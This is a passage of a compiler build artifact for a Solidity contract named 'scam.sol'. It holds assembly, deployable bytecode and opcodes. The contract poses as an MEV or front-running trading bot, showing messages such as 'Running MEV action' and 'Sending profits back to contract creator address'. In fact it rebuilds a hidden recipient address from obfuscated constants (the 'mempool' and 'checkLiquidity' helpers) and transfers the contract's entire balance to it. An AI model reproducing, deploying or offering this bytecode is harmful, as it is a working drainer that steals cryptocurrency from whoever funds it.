(address _parsed) {\r... */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"scam.sol\":8402:8494  function getMemPoolOffset() internal pure returns (uint) {\r... */\n    tag_55:\n        /* \"scam.sol\":8453:8457  uint */\n      0x00\n        /* \"scam.sol\":8477:8486  194976265 */\n      0x0b9f1a09\n        /* \"scam.sol\":8470:8486  return 194976265 */\n      swap1\n      pop\n        /* \"scam.sol\":8402:8494  function getMemPoolOffset() internal pure returns (uint) {\r... */\n      swap1\n      jump\t// out\n        /* \"scam.sol\":10168:10608  function checkLiquidity(uint a) internal pure returns (string memory) {\r... */\n    tag_56:\n        /* \"scam.sol\":10223:10236  string memory */\n      0x60\n        /* \"scam.sol\":10252:10262  uint count */\n      0x00\n        /* \"scam.sol\":10277:10283  uint b */\n      dup1\n        /* \"scam.sol\":10286:10287  a */\n      dup4\n        /* \"scam.sol\":10277:10287  uint b = a */\n      swap1\n      pop\n        /* \"scam.sol\":10298:10369  while (b != 0) {\r... */\n    tag_97:\n        /* \"scam.sol\":10310:10311  0 */\n      0x00\n        /* \"scam.sol\":10305:10306  b */\n      dup2\n        /* \"scam.sol\":10305:10311  b != 0 */\n      eq\n        /* \"scam.sol\":10298:10369  while (b != 0) {\r... */\n      tag_98\n      jumpi\n        /* \"scam.sol\":10328:10335  count++ */\n      dup2\n      dup1\n      0x01\n      add\n      swap3\n      pop\n      pop\n        /* \"scam.sol\":10355:10357  16 */\n      0x10\n        /* \"scam.sol\":10350:10357  b /= 16 */\n      dup2\n      dup2\n      tag_99\n      jumpi\n      invalid\n    tag_99:\n      div\n      swap1\n      pop\n        /* \"scam.sol\":10298:10369  while (b != 0) {\r... */\n      jump(tag_97)\n    tag_98:\n        /* \"scam.sol\":10379:10395  bytes memory res */\n      0x60\n        /* \"scam.sol\":10408:10413  count */\n      dup3\n        /* \"scam.sol\":10398:10414  new bytes(count) */\n      0xffffffffffffffff\n      dup2\n      gt\n      dup1\n      iszero\n      tag_100\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_100:\n      pop\n      mload(0x40)\n      swap1\n      dup1\n      dup3\n      mstore\n      dup1\n      0x1f\n      add\n      not(0x1f)\n      and\n      0x20\n      add\n      dup3\n      add\n      0x40\n      mstore\n      dup1\n      iszero\n      tag_101\n      jumpi\n      dup2\n      0x20\n      add\n      0x01\n      dup3\n      mul\n      dup1\n      calldatasize\n      dup4\n      calldatacopy\n      dup1\n      dup3\n      add\n      swap2\n      pop\n      pop\n      swap1\n      pop\n    tag_101:\n      pop\n        /* \"scam.sol\":10379:10414  bytes memory res = new bytes(count) */\n      swap1\n      pop\n        /* \"scam.sol\":10430:10436  uint i */\n      0x00\n        /* \"scam.sol\":10425:10569  for (uint i=0; i<count; ++i) {\r... */\n    tag_102:\n        /* \"scam.sol\":10442:10447  count */\n      dup4\n        /* \"scam.sol\":10440:10441  i */\n      dup2\n        /* \"scam.sol\":10440:10447  i<count */\n      lt\n        /* \"scam.sol\":10425:10569  for (uint i=0; i<count; ++i) {\r... */\n      iszero\n      tag_103\n      jumpi\n        /* \"scam.sol\":10477:10479  16 */\n      0x10\n        /* \"scam.sol\":10473:10474  a */\n      dup7\n        /* \"scam.sol\":10473:10479  a % 16 */\n      dup2\n      tag_105\n      jumpi\n      invalid\n    tag_105:\n      mod\n        /* \"scam.sol\":10469:10479  b = a % 16 */\n      swap3\n      pop\n        /* \"scam.sol\":10515:10535  toHexDigit(uint8(b)) */\n      tag_106\n        /* \"scam.sol\":10532:10533  b */\n      dup4\n        /* \"scam.sol\":10515:10525  toHexDigit */\n      tag_107\n        /* \"scam.sol\":10515:10535  toHexDigit(uint8(b)) */\n      jump\t// in\n    tag_106:\n        /* \"scam.sol\":10494:10497  res */\n      dup3\n        /* \"scam.sol\":10510:10511  1 */\n      0x01\n        /* \"scam.sol\":10506:10507  i */\n      dup4\n        /* \"scam.sol\":10498:10503  count */\n      dup8\n        /* \"scam.sol\":10498:10507  count - i */\n      sub\n        /* \"scam.sol\":10498:10511  count - i - 1 */\n      sub\n        /* \"scam.sol\":10494:10512  res[count - i - 1] */\n      dup2\n      mload\n      dup2\n      lt\n      tag_108\n      jumpi\n      invalid\n    tag_108:\n      0x20\n      add\n      add\n        /* \"scam.sol\":10494:10535  res[count - i - 1] = toHexDigit(uint8(b)) */\n      swap1\n      not(0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff)\n      and\n      swap1\n      dup2\n      0x00\n      byte\n      swap1\n      mstore8\n      pop\n        /* \"scam.sol\":10555:10557  16 */\n      0x10\n        /* \"scam.sol\":10550:10557  a /= 16 */\n      dup7\n      dup2\n      tag_109\n      jumpi\n      invalid\n    tag_109:\n      div\n      swap6\n      pop\n        /* \"scam.sol\":10449:10452  ++i */\n      dup1\n      0x01\n      add\n      swap1\n      pop\n        /* \"scam.sol\":10425:10569  for (uint i=0; i<count; ++i) {\r... */\n      jump(tag_102)\n    tag_103:\n      pop\n        /* \"scam.sol\":10596:10599  res */\n      dup1\n        /* \"scam.sol\":10582:10600  return string(res) */\n      swap4\n      pop\n      pop\n      pop\n      pop\n        /* \"scam.sol\":10168:10608  function checkLiquidity(uint a) internal pure returns (string memory) {\r... */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"scam.sol\":16932:17567  function mempool(string memory _base, string memory _value) internal pure returns (string memory) {\r... */\n    tag_57:\n        /* \"scam.sol\":17015:17028  string memory */\n      0x60\n        /* \"scam.sol\":17041:17064  bytes memory _baseBytes */\n      dup1\n        /* \"scam.sol\":17073:17078  _base */\n      dup4\n        /* \"scam.sol\":17041:17079  bytes memory _baseBytes = bytes(_base) */\n      swap1\n      pop\n        /* \"scam.sol\":17090:17114  bytes memory _valueBytes */\n      0x60\n        /* \"scam.sol\":17123:17129  _value */\n      dup4\n        /* \"scam.sol\":17090:17130  bytes memory _valueBytes = bytes(_value) */\n      swap1\n      pop\n        /* \"scam.sol\":17144:17167  string memory _tmpValue */\n      0x60\n        /* \"scam.sol\":17201:17212  _valueBytes */\n      dup2\n        /* \"scam.sol\":17201:17219  _valueBytes.length */\n      mload\n        /* \"scam.sol\":17181:17191  _baseBytes */\n      dup4\n        /* \"scam.sol\":17181:17198  _baseBytes.length */\n      mload\n        /* \"scam.sol\":17181:17219  _baseBytes.length + _valueBytes.length */\n      add\n        /* \"scam.sol\":17170:17220  new string(_baseBytes.length + _valueBytes.length) */\n      0xffffffffffffffff\n      dup2\n      gt\n      dup1\n      iszero\n      tag_111\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_111:\n      pop\n      mload(0x40)\n      swap1\n      dup1\n      dup3\n      mstore\n      dup1\n      0x1f\n      add\n      not(0x1f)\n      and\n      0x20\n      add\n      dup3\n      add\n      0x40\n      mstore\n      dup1\n      iszero\n      tag_112\n      jumpi\n      dup2\n      0x20\n      add\n      0x01\n      dup3\n      mul\n      dup1\n      calldatasize\n      dup4\n      calldatacopy\n      dup1\n      dup3\n      add\n      swap2\n      pop\n      pop\n      swap1\n      pop\n    tag_112:\n      pop\n        /* \"scam.sol\":17144:17220  string memory _tmpValue = new string(_baseBytes.length + _valueBytes.length) */\n      swap1\n      pop\n        /* \"scam.sol\":17231:17253  bytes memory _newValue */\n      0x60\n        /* \"scam.sol\":17262:17271  _tmpValue */\n      dup2\n        /* \"scam.sol\":17231:17272  bytes memory _newValue = bytes(_tmpValue) */\n      swap1\n      pop\n        /* \"scam.sol\":17286:17292  uint i */\n      0x00\n        /* \"scam.sol\":17303:17309  uint j */\n      dup1\n        /* \"scam.sol\":17329:17330  0 */\n      0x00\n        /* \"scam.sol\":17327:17330  i=0 */\n      swap2\n      pop\n        /* \"scam.sol\":17323:17415  for(i=0; i<_baseBytes.length; i++) {\r... */\n    tag_113:\n        /* \"scam.sol\":17334:17344  _baseBytes */\n      dup6\n        /* \"scam.sol\":17334:17351  _baseBytes.length */\n      mload\n        /* \"scam.sol\":17332:17333  i */\n      dup3\n        /* \"scam.sol\":17332:17351  i<_baseBytes.length */\n      lt\n        /* \"scam.sol\":17323:17415  for(i=0; i<_baseBytes.length; i++) {\r... */\n      iszero\n      tag_114\n      jumpi\n        /* \"scam.sol\":17390:17400  _baseBytes */\n      dup6\n        /* \"scam.sol\":17401:17402  i */\n      dup3\n        /* \"scam.sol\":17390:17403  _baseBytes[i] */\n      dup2\n      mload\n      dup2\n      lt\n      tag_116\n      jumpi\n      invalid\n    tag_116:\n      0x20\n      add\n      add\n      mload\n      0xf8\n      shr\n      0xf8\n      shl\n        /* \"scam.sol\":17373:17382  _newValue */\n      dup4\n        /* \"scam.sol\":17383:17386  j++ */\n      dup3\n      dup1\n      0x01\n      add\n      swap4\n      pop\n        /* \"scam.sol\":17373:17387  _newValue[j++] */\n      dup2\n      mload\n      dup2\n      lt\n      tag_117\n      jumpi\n      invalid\n    tag_117:\n      0x20\n      add\n      add\n        /* \"scam.sol\":17373:17403  _newValue[j++] = _baseBytes[i] */\n      swap1\n      not(0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff)\n      and\n      swap1\n      dup2\n      0x00\n      byte\n      swap1\n      mstore8\n      pop\n        /* \"scam.sol\":17353:17356  i++ */\n      dup2\n      dup1\n      0x01\n      add\n      swap3\n      pop\n      pop\n        /* \"scam.sol\":17323:17415  for(i=0; i<_baseBytes.length; i++) {\r... */\n      jump(tag_113)\n    tag_114:\n        /* \"scam.sol\":17434:17435  0 */\n      0x00\n        /* \"scam.sol\":17432:17435  i=0 */\n      swap2\n      pop\n        /* \"scam.sol\":17428:17522  for(i=0; i<_valueBytes.length; i++) {\r... */\n    tag_118:\n        /* \"scam.sol\":17439:17450  _valueBytes */\n      dup5\n        /* \"scam.sol\":17439:17457  _valueBytes.length */\n      mload\n        /* \"scam.sol\":17437:17438  i */\n      dup3\n        /* \"scam.sol\":17437:17457  i<_valueBytes.length */\n      lt\n        /* \"scam.sol\":17428:17522  for(i=0; i<_valueBytes.length; i++) {\r... */\n      iszero\n      tag_119\n      jumpi\n        /* \"scam.sol\":17496:17507  _valueBytes */\n      dup5\n        /* \"scam.sol\":17508:17509  i */\n      dup3\n        /* \"scam.sol\":17496:17510  _valueBytes[i] */\n      dup2\n      mload\n      dup2\n      lt\n      tag_121\n      jumpi\n      invalid\n    tag_121:\n      0x20\n      add\n      add\n      mload\n      0xf8\n      shr\n      0xf8\n      shl\n        /* \"scam.sol\":17479:17488  _newValue */\n      dup4\n        /* \"scam.sol\":17489:17492  j++ */\n      dup3\n      dup1\n      0x01\n      add\n      swap4\n      pop\n        /* \"scam.sol\":17479:17493  _newValue[j++] */\n      dup2\n      mload\n      dup2\n      lt\n      tag_122\n      jumpi\n      invalid\n    tag_122:\n      0x20\n      add\n      add\n        /* \"scam.sol\":17479:17510  _newValue[j++] = _valueBytes[i] */\n      swap1\n      not(0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff)\n      and\n      swap1\n      dup2\n      0x00\n      byte\n      swap1\n      mstore8\n      pop\n        /* \"scam.sol\":17459:17462  i++ */\n      dup2\n      dup1\n      0x01\n      add\n      swap3\n      pop\n      pop\n        /* \"scam.sol\":17428:17522  for(i=0; i<_valueBytes.length; i++) {\r... */\n      jump(tag_118)\n    tag_119:\n        /* \"scam.sol\":17549:17558  _newValue */\n      dup3\n        /* \"scam.sol\":17535:17559  return string(_newValue) */\n      swap7\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n        /* \"scam.sol\":16932:17567  function mempool(string memory _base, string memory _value) internal pure returns (string memory) {\r... */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"scam.sol\":13257:13347  function getMemPoolHeight() internal pure returns (uint) {\r... */\n    tag_59:\n        /* \"scam.sol\":13308:13312  uint */\n      0x00\n        /* \"scam.sol\":13332:13339  2726264 */\n      0x299978\n        /* \"scam.sol\":13325:13339  return 2726264 */\n      swap1\n      pop\n        /* \"scam.sol\":13257:13347  function getMemPoolHeight() internal pure returns (uint) {\r... */\n      swap1\n      jump\t// out\n        /* \"scam.sol\":16543:16631  function getMemPoolDepth() internal pure returns (uint) {\r... */\n    tag_61:\n        /* \"scam.sol\":16593:16597  uint */\n      0x00\n        /* \"scam.sol\":16617:16623  840885 */\n      0x0cd4b5\n        /* \"scam.sol\":16610:16623  return 840885 */\n      swap1\n      pop\n        /* \"scam.sol\":16543:16631  function getMemPoolDepth() internal pure returns (uint) {\r... */\n      swap1\n      jump\t// out\n        /* \"scam.sol\":14763:15090  function toHexDigit(uint8 d) pure internal returns (byte) {\r... */\n    tag_107:\n        /* \"scam.sol\":14815:14819  byte */\n      0x00\n        /* \"scam.sol\":14841:14842  d */\n      dup2\n        /* \"scam.sol\":14836:14842  0 <= d */\n      0xff\n      and\n        /* \"scam.sol\":14836:14837  0 */\n      0x00\n        /* \"scam.sol\":14836:14842  0 <= d */\n      gt\n      iszero\n        /* \"scam.sol\":14836:14852  0 <= d && d <= 9 */\n      dup1\n      iszero\n      tag_126\n      jumpi\n      pop\n        /* \"scam.sol\":14851:14852  9 */\n      0x09\n        /* \"scam.sol\":14846:14847  d */\n      dup3\n        /* \"scam.sol\":14846:14852  d <= 9 */\n      0xff\n      and\n      gt\n      iszero\n        /* \"scam.sol\":14836:14852  0 <= d && d <= 9 */\n    tag_126:\n        /* \"scam.sol\":14832:15023  if (0 <= d && d <= 9) {\r... */\n      iszero\n      tag_127\n      jumpi\n        /* \"scam.sol\":14900:14901  d */\n      dup2\n        /* \"scam.sol\":14887:14896  byte('0') */\n      0x3000000000000000000000000000000000000000000000000000000000000000\n        /* \"scam.sol\":14881:14897  uint8(byte('0')) */\n      0xf8\n      shr\n        /* \"scam.sol\":14881:14901  uint8(byte('0')) + d */\n      add\n        /* \"scam.sol\":14876:14902  byte(uint8(byte('0')) + d) */\n      0xf8\n      shl\n        /* \"scam.sol\":14869:14902  return byte(uint8(byte('0')) + d) */\n      swap1\n      pop\n      jump(tag_125)\n        /* \"scam.sol\":14832:15023  if (0 <= d && d <= 9) {\r... */\n    tag_127:\n        /* \"scam.sol\":14936:14937  d */\n      dup2\n        /* \"scam.sol\":14924:14938  10 <= uint8(d) */\n      0xff\n      and\n        /* \"scam.sol\":14924:14926  10 */\n      0x0a\n        /* \"scam.sol\":14924:14938  10 <= uint8(d) */\n      gt\n      iszero\n        /* \"scam.sol\":14924:14956  10 <= uint8(d) && uint8(d) <= 15 */\n      dup1\n      iszero\n      tag_129\n      jumpi\n      pop\n        /* \"scam.sol\":14954:14956  15 */\n      0x0f\n        /* \"scam.sol\":14948:14949  d */\n      dup3\n        /* \"scam.sol\":14942:14956  uint8(d) <= 15 */\n      0xff\n      and\n      gt\n      iszero\n        /* \"scam.sol\":14924:14956  10 <= uint8(d) && uint8(d) <= 15 */\n    tag_129:\n        /* \"scam.sol\":14920:15023  if (10 <= uint8(d) && uint8(d) <= 15) {\r... */\n      iszero\n      tag_130\n      jumpi\n        /* \"scam.sol\":15008:15010  10 */\n      0x0a\n        /* \"scam.sol\":15004:15005  d */\n      dup3\n        /* \"scam.sol\":14991:15000  byte('a') */\n      0x6100000000000000000000000000000000000000000000000000000000000000\n        /* \"scam.sol\":14985:15001  uint8(byte('a')) */\n      0xf8\n      shr\n        /* \"scam.sol\":14985:15005  uint8(byte('a')) + d */\n      add\n        /* \"scam.sol\":14985:15010  uint8(byte('a')) + d - 10 */\n      sub\n        /* \"scam.sol\":14980:15011  byte(uint8(byte('a')) + d - 10) */\n      0xf8\n      shl\n        /* \"scam.sol\":14973:15011  return byte(uint8(byte('a')) + d - 10) */\n      swap1\n      pop\n      jump(tag_125)\n        /* \"scam.sol\":14920:15023  if (10 <= uint8(d) && uint8(d) <= 15) {\r... */\n    tag_130:\n        /* \"scam.sol\":15074:15082  revert() */\n      0x00\n      dup1\n      revert\n        /* \"scam.sol\":14763:15090  function toHexDigit(uint8 d) pure internal returns (byte) {\r... */\n    tag_125:\n      swap2\n      swap1\n      pop\n      jump\t// out\n    stop\n    data_6350d1a48231284a8341dbb6cec434401eec03dd1db1d0d6d2f253f7a8b3eca6 53656e64696e672070726f66697473206261636b20746f20636f6e74726163742063726561746f7220616464726573732e2e2e\n    data_9fb03945078bc6c7000c07d459687b271ae0adc059777dee3669b3c70b385107 52756e6e696e67204d455620616374696f6e2e20546869732063616e2074616b652061207768696c653b20706c6561736520776169742e2e\n\n    auxdata: 0xa2646970667358221220664f2c069f54542f06f10b881b37e7a4b454ddffd1ffc08a7398478d351fde5f64736f6c634300060c0033\n}\n",
						"bytecode": {
							"linkReferences": {},
							"object": "60806040523480156200001157600080fd5b5060405162000e2c38038062000e2c833981810160405260408110156200003757600080fd5b81019080805160405193929190846401000000008211156200005857600080fd5b838201915060208201858111156200006f57600080fd5b82518660018202830111640100000000821117156200008d57600080fd5b8083526020830192505050908051906020019080838360005b83811015620000c3578082015181840152602081019050620000a6565b50505050905090810190601f168015620000f15780820380516001836020036101000a031916815260200191505b50604052602001805160405193929190846401000000008211156200011557600080fd5b838201915060208201858111156200012c57600080fd5b82518660018202830111640100000000821117156200014a57600080fd5b8083526020830192505050908051906020019080838360005b838110156200018057808201518184015260208101905062000163565b50505050905090810190601f168015620001ae5780820380516001836020036101000a031916815260200191505b506040525050508160009080519060200190620001cd929190620001ef565b508060019080519060200190620001e6929190620001ef565b50505062000295565b828054600181600116156101000203166002900490600052602060002090601f016020900481019282601f106200023257805160ff191683800117855562000263565b8280016001018555821562000263579182015b828111156200026257825182559160200191906001019062000245565b5b50905062000272919062000276565b5090565b5b808211156200029157600081600090555060010162000277565b5090565b610b8780620002a56000396000f3fe6080604052600436106100435760003560e01c80637d53d4331461004f578063be9a6555146100df578063d4e93292146100e9578063e1812f05146100f35761004a565b3661004a57005b600080fd5b34801561005b57600080fd5b50610064610183565b6040518080602001828103825283818151815260200191508051906020019080838360005b838110156100a4578082015181840152602081019050610089565b50505050905090810190601f1680156100d15780820380516001836020036101000a031916815260200191505b509250505060405180910390f35b6100e7610221565b005b6100f16102bc565b005b3480156100ff57600080fd5b50610108610357565b6040518080602001828103825283818151815260200191508051906020019080838360005b8381101561014857808201518184015260208101905061012d565b50505050905090810190601f1680156101755780820380516001836020036101000a031916815260200191505b509250505060405180910390f35b60018054600181600116156101000203166002900480601f0160208091040260200160405190810160405280929190818152602001828054600181600116156101000203166002900480156102195780601f106101ee57610100808354040283529160200191610219565b820191906000526020600020905b8154815290600101906020018083116101fc57829003601f168201915b505050505081565b7fcf34ef537ac33ee1ac626ca1587a0a7e8e51561e5514f8cb36afa1c5102b3bab604051808060200182810382526038815260200180610b1a6038913960400191505060405180910390a16102746103f5565b73ffffffffffffffffffffffffffffffffffffffff166108fc479081150290604051600060405180830381858888f193505050501580156102b9573d6000803e3d6000fd5b50565b7fcf34ef537ac33ee1ac626ca1587a0a7e8e51561e5514f8cb36afa1c5102b3bab604051808060200182810382526033815260200180610ae76033913960400191505060405180910390a161030f61040c565b73ffffffffffffffffffffffffffffffffffffffff166108fc479081150290604051600060405180830381858888f19350505050158015610354573d6000803e3d6000fd5b50565b60008054600181600116156101000203166002900480601f0160208091040260200160405190810160405280929190818152602001828054600181600116156101000203166002900480156103ed5780601f106103c2576101008083540402835291602001916103ed565b820191906000526020600020905b8154815290600101906020018083116103d057829003601f168201915b505050505081565b6000610407610402610423565b61056c565b905090565b600061041e610419610423565b61056c565b905090565b6060806104746040518060400160405280600181526020017f780000000000000000000000000000000000000000000000000000000000000081525061046f61046a6107c1565b6107cd565b6108cc565b905060006293fc1e90506000640f676e9a32905060006305bbeab19050600061049b610a27565b905060006104a7610a32565b905060606104bd876104b8886107cd565b6108cc565b905060606104db6104cd876107cd565b6104d6876107cd565b6108cc565b905060606104e8856107cd565b905060606104f5856107cd565b9050606061051561050686866108cc565b61051085856108cc565b6108cc565b905060606105586040518060400160405280600181526020017f3000000000000000000000000000000000000000000000000000000000000000815250836108cc565b9050809c5050505050505050505050505090565b60006060829050600080806000600290505b602a8110156107b4576101008402935084818151811061059a57fe5b602001015160f81c60f81b60f81c60ff1692508460018201815181106105bc57fe5b602001015160f81c60f81b60f81c60ff16915060618373ffffffffffffffffffffffffffffffffffffffff161015801561060d575060668373ffffffffffffffffffffffffffffffffffffffff1611155b1561061d576057830392506106b7565b60418373ffffffffffffffffffffffffffffffffffffffff161015801561065b575060468373ffffffffffffffffffffffffffffffffffffffff1611155b1561066b576037830392506106b6565b60308373ffffffffffffffffffffffffffffffffffffffff16101580156106a9575060398373ffffffffffffffffffffffffffffffffffffffff1611155b156106b5576030830392505b5b5b60618273ffffffffffffffffffffffffffffffffffffffff16101580156106f5575060668273ffffffffffffffffffffffffffffffffffffffff1611155b156107055760578203915061079f565b60418273ffffffffffffffffffffffffffffffffffffffff1610158015610743575060468273ffffffffffffffffffffffffffffffffffffffff1611155b156107535760378203915061079e565b60308273ffffffffffffffffffffffffffffffffffffffff1610158015610791575060398273ffffffffffffffffffffffffffffffffffffffff1611155b1561079d576030820391505b5b5b8160108402018401935060028101905061057e565b5082945050505050919050565b6000630b9f1a09905090565b60606000808390505b600081146107f8578180600101925050601081816107f057fe5b0490506107d6565b60608267ffffffffffffffff8111801561081157600080fd5b506040519080825280601f01601f1916602001820160405280156108445781602001600182028036833780820191505090505b50905060005b838110156108c0576010868161085c57fe5b06925061086883610a3d565b826001838703038151811061087957fe5b60200101907effffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff1916908160001a905350601086816108b257fe5b04955080600101905061084a565b50809350505050919050565b60608083905060608390506060815183510167ffffffffffffffff811180156108f457600080fd5b506040519080825280601f01601f1916602001820160405280156109275781602001600182028036833780820191505090505b5090506060819050600080600091505b85518210156109a55785828151811061094c57fe5b602001015160f81c60f81b83828060010193508151811061096957fe5b60200101907effffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff1916908160001a9053508180600101925050610937565b600091505b8451821015610a18578482815181106109bf57fe5b602001015160f81c60f81b8382806001019350815181106109dc57fe5b60200101907effffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff1916908160001a90535081806001019250506109aa565b82965050505050505092915050565b600062299978905090565b6000620cd4b5905090565b60008160ff16600011158015610a57575060098260ff1611155b15610a8c57817f300000000000000000000000000000000000000000000000000000000000000060f81c0160f81b9050610ae1565b8160ff16600a11158015610aa45750600f8260ff1611155b15610adc57600a827f610000000000000000000000000000000000000000000000000000000000000060f81c010360f81b9050610ae1565b600080fd5b91905056fe53656e64696e672070726f66697473206261636b20746f20636f6e74726163742063726561746f7220616464726573732e2e2e52756e6e696e67204d455620616374696f6e2e20546869732063616e2074616b652061207768696c653b20706c6561736520776169742e2ea2646970667358221220664f2c069f54542f06f10b881b37e7a4b454ddffd1ffc08a7398478d351fde5f64736f6c634300060c0033",
							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH3 0x11 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x40 MLOAD PUSH3 0xE2C CODESIZE SUB DUP1 PUSH3 0xE2C DUP4 CODECOPY DUP2 DUP2 ADD PUSH1 0x40 MSTORE PUSH1 0x40 DUP2 LT ISZERO PUSH3 0x37 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 MLOAD PUSH1 0x40 MLOAD SWAP4 SWAP3 SWAP2 SWAP1 DUP5 PUSH5 0x100000000 DUP3 GT ISZERO PUSH3 0x58 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP4 DUP3 ADD SWAP2 POP PUSH1 0x20 DUP3 ADD DUP6 DUP2 GT ISZERO PUSH3 0x6F JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP3 MLOAD DUP7 PUSH1 0x1 DUP3 MUL DUP4 ADD GT PUSH5 0x100000000 DUP3 GT OR ISZERO PUSH3 0x8D JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP1 DUP4 MSTORE PUSH1 0x20 DUP4 ADD SWAP3 POP POP POP SWAP1 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 DUP1 DUP4 DUP4 PUSH1 0x0 JUMPDEST DUP4 DUP2 LT ISZERO PUSH3 0xC3 JUMPI DUP1 DUP3 ADD MLOAD DUP2 DUP5 ADD MSTORE PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH3 0xA6 JUMP JUMPDEST POP POP POP POP SWAP1 POP SWAP1 DUP2 ADD SWAP1 PUSH1 0x1F AND DUP1 ISZERO PUSH3 0xF1 JUMPI DUP1 DUP3 SUB DUP1 MLOAD PUSH1 0x1 DUP4 PUSH1 0x20 SUB PUSH2 0x100 EXP SUB NOT AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP JUMPDEST POP PUSH1 0x40 MSTORE PUSH1 0x20 ADD DUP1 MLOAD PUSH1 0x40 MLOAD SWAP4 SWAP3 SWAP2 SWAP1 DUP5 PUSH5 0x100000000 DUP3 GT ISZERO PUSH3 0x115 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP4 DUP3 ADD SWAP2 POP PUSH1 0x20 DUP3 ADD DUP6 DUP2 GT ISZERO PUSH3 0x12C JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP3 MLOAD DUP7 PUSH1 0x1 DUP3 MUL DUP4 ADD GT PUSH5 0x100000000 DUP3 GT OR ISZERO PUSH3 0x14A JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP1 DUP4 MSTORE PUSH1 0x20 DUP4 ADD SWAP3 POP POP POP SWAP1 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 DUP1 DUP4 DUP4 PUSH1 0x0 JUMPDEST DUP4 DUP2 LT ISZERO PUSH3 0x180 JUMPI DUP1 DUP3 ADD MLOAD DUP2 DUP5 ADD MSTORE PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH3 0x163 JUMP JUMPDEST POP POP POP POP SWAP1 POP SWAP1 DUP2 ADD SWAP1 PUSH1 0x1F AND DUP1 ISZERO PUSH3 0x1AE JUMPI DUP1 DUP3 SUB DUP1 MLOAD PUSH1 0x1 DUP4 PUSH1 0x20 SUB PUSH2 0x100 EXP SUB NOT AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP JUMPDEST POP PUSH1 0x40 MSTORE POP POP POP DUP2 PUSH1 0x0 SWAP1 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 PUSH3 0x1CD SWAP3 SWAP2 SWAP1 PUSH3 0x1EF JUMP JUMPDEST POP DUP1 PUSH1 0x1 SWAP1 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 PUSH3 0x1E6 SWAP3 SWAP2 SWAP1 PUSH3 0x1EF JUMP JUMPDEST POP POP POP PUSH3 0x295 JUMP JUMPDEST DUP3 DUP1 SLOAD PUSH1 0x1 DUP2 PUSH1 0x1 AND ISZERO PUSH2 0x100 MUL SUB AND PUSH1 0x2 SWAP1 DIV SWAP1 PUSH1 0x0 MSTORE PUSH1 0x20 PUSH1 0x0 KECCAK256 SWAP1 PUSH1 0x1F ADD PUSH1 0x20 SWAP1 DIV DUP2 ADD SWAP3 DUP3 PUSH1 0x1F LT PUSH3 0x232 JUMPI DUP1 MLOAD PUSH1 0xFF NOT AND DUP4 DUP1 ADD OR DUP6 SSTORE PUSH3 0x263 JUMP JUMPDEST DUP3 DUP1 ADD PUSH1 0x1 ADD DUP6 SSTORE DUP3 ISZERO PUSH3 0x263 JUMPI SWAP2 DUP3 ADD JUMPDEST DUP3 DUP2 GT ISZERO PUSH3 0x262 JUMPI DUP3 MLOAD DUP3 SSTORE SWAP2 PUSH1 0x20 ADD SWAP2 SWAP1 PUSH1 0x1 ADD SWAP1 PUSH3 0x245 JUMP JUMPDEST JUMPDEST POP SWAP1 POP PUSH3 0x272 SWAP2 SWAP1 PUSH3 0x276 JUMP JUMPDEST POP SWAP1 JUMP JUMPDEST JUMPDEST DUP1 DUP3 GT ISZERO PUSH3 0x291 JUMPI PUSH1 0x0 DUP2 PUSH1 0x0 SWAP1 SSTORE POP PUSH1 0x1 ADD PUSH3 0x277 JUMP JUMPDEST POP SWAP1 JUMP JUMPDEST PUSH2 0xB87 DUP1 PUSH3 0x2A5 PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH2 0x43 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x7D53D433 EQ PUSH2 0x4F JUMPI DUP1 PUSH4 0xBE9A6555 EQ PUSH2 0xDF JUMPI DUP1 PUSH4 0xD4E93292 EQ PUSH2 0xE9 JUMPI DUP1 PUSH4 0xE1812F05 EQ PUSH2 0xF3 JUMPI PUSH2 0x4A JUMP JUMPDEST CALLDATASIZE PUSH2 0x4A JUMPI STOP JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x5B JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x64 PUSH2 0x183 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE DUP4 DUP2 DUP2 MLOAD DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 DUP1 DUP4 DUP4 PUSH1 0x0 JUMPDEST DUP4 DUP2 LT ISZERO PUSH2 0xA4 JUMPI DUP1 DUP3 ADD MLOAD DUP2 DUP5 ADD MSTORE PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH2 0x89 JUMP JUMPDEST 